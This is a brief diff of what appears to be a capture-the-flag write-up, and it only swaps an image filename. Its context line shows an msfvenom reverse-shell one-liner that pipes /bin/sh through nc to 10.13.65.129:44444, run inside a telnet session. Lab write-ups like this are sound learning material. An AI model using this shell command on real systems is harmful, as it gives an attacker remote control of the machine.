@@ -39,5 +39,5 @@ after that we copy and paste our msfvenom payload into the telnet session and ru
 
 `.RUN mkfifo /tmp/qdym; nc 10.13.65.129 44444 0</tmp/qdym | /bin/sh >/tmp/qdym 2>&1; rm /tmp/qdym` was run in the telnet session, then:
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
